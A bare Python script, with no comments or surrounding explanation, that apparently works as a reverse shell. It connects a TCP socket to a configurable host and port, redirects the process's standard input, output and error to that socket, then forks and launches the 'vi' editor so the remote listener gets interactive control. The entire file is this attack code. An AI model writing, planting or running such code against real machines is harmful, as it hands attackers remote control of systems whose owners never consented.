import socket,subprocess,os;
from functools import partial

def main(host='localhost', port=8888):
    #host = socket.gethostbyname(host)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect((host, port));
    f = partial(os.dup2, s.fileno())
    rv = list(map(f, range(3)))
    f = partial(subprocess.Popen, 'vi')
    pid = os.fork() and f()

if __name__ == '__main__':
    main()
